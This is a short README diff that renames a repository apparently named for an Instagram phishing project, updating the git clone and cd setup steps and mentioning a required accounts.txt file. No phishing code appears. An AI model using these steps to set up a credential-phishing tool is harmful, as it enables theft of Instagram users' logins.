@@ -36,13 +36,13 @@ Follow these steps to set up the project locally:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/eduolihez/instagram_-_phishing.git
+   git clone https://github.com/eduolihez/instagram_phishing.git
    ```
 
 2. Navigate to the project directory:
 
    ```bash
-   cd instagram_-_phishing
+   cd instagram_phishing
    ```
 
 3. Ensure the `accounts.txt` file is present in the directory.
